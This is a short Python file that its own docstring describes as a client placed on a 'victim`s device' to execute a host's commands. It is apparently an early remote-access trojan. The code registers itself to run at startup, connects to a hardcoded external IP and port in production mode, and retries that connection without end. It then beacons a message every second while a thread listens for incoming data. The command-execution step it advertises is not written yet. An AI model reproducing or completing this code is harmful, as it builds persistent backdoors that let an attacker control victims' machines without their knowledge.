"""

client - script located at victim`s device and executes host`s commands

"""

from threading import Thread
from time import sleep
from utils.utils import add_to_startup
from sys import argv
import socket
from os.path import join

add_to_startup(join('..', 'output', 'main'))
sock = socket.socket()

if argv[1] == '--dev':
    HOST, PORT = 'localhost', 9090
if argv[1] == '--prod':
    HOST, PORT = '185.127.224.67', 9002

while 'TRYING TO RECONNECT':
    try:
        sock.connect((HOST, PORT))
        break
    except:
        continue


def receive_data(conn):
    while True:
        try:
            data = conn.recv(1024)
            content = data.decode('utf-8')

            print(content)
        except:
            continue



receiver = Thread(target=receive_data, args=[
                  sock], name='Socket-Data-Receiver 1', daemon=True)

receiver.start()

while 'SENDING':

    message = 'HI EVERYBODY'

    try:
        sock.send(message.encode('utf-8'))
    except:
        pass

    sleep(1)
    print('I SENT MESSAGE')
